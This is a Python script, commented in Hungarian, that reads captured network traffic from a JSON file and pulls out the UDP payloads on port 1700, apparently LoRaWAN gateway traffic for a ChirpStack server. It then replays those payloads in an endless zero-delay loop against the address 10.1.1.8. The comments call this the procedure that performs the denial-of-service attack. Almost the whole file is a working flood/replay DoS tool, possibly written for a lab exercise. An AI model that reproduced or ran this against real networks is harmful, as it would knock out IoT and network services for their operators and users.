import json
import os
import socket
import time


def main():
    """
    Fő eljárás, a program belépési pontja.
    """
    # Felvett hálózati forgalom betöltése
    json_file = "traffic/250413.json"
    traffic = load_json(json_file)
    # Korábbi scriptből átvett funkció a megfelelő byte-ok kinyerésére
    mybytes = analyze_bytes(traffic)
    # A DoS végrehajtásáért felelős eljárás
    dos_chirp(mybytes, "10.1.1.8")

def send_udp_packet(msg: bytes, IP_address: str, UDP_port: int, interval: float):
    """
    Eljárás, mely az UDP csomagokat küldi a megadott IP címre és porta, a megadott
    időközönként.

    Bemenet:
        msg (byte): küldendő bájtok
        IP_address (string): cél IP cím
        UPD_PORT (int): cél port
        interval (float): csomagküldések közti idő másodpercben megadva
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(msg, (IP_address, UDP_port))
    time.sleep(interval)

def dos_chirp(mybytes: list, IP_addr: str):
    """
    Eljárás, mely a DoS-olást végzi.
    
    Bemenet:
        mybytes (list): küldendő byte-ok listája
        IP_addr (string): célpont IP címe
    """
    # számláló, hogy lássam, hogy eddig mennyi packet-et küldtem el
    counter = 1
    # a végtelen ciklus a DoS-oláshoz
    while True:
        for item in mybytes:
            # itt írja ki, hogy hol jár éppen
            print(f'msg Nr.: {counter}')
            # itt küldi el az UDP csomagot
            send_udp_packet(item, IP_addr, 1700, 0)
            counter += 1
            clear_screen()

def analyze_bytes(data)->list:
    """
    Függvény, mely kiszedi a payload-ot az UDP csomagokból.

    Bemenet:
        data (dict): a json fájlból betöltött hálózati forgalom
    Visszatérési érték:
        mybytes (list): payload-ok listája
    """
    # üres lista a byte-oknak
    mybytes = []
    for d in data:
        try:
            # biztonsági ellenőrzés, hogy tényleg a megfelelő UDP csomagokat elemezze a szkript
            if d["_source"]["layers"]["udp"]["udp.dstport"] == "1700"  \
            or d["_source"]["layers"]["udp"]["udp.srcport"] == "1700":
                # az UDP csomagból az "érdekes" adatok parszolása és kigyűjtése
                bytes_that_i_need = d["_source"]["layers"]["data"]["data.data"]
                readable_bytes = bytes.fromhex(''.join(bytes_that_i_need.split(':')))
                mybytes.append(readable_bytes)
        except:
            continue
    # a byte-okkal teli lista visszaküldése a hívás helyére
    return mybytes

def load_json(filename: str):
    """
    Függvény a json betöltéséhez.

    Bemenet:
        filename (str): json elérési útvonala
    Visszatérési érték:
        (dict vagy list): parszolt json adat
    """
    try:
        with open(filename, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f'Error: {e}')
        return None

def clear_screen():
    """
    Eljárás, mely képernyőt töröl operációs rendszertől függetlenül
    """
    if os.name.lower() == 'nt':
        os.system('cls')
    else:
        os.system('clear')

if __name__ == "__main__":
    main()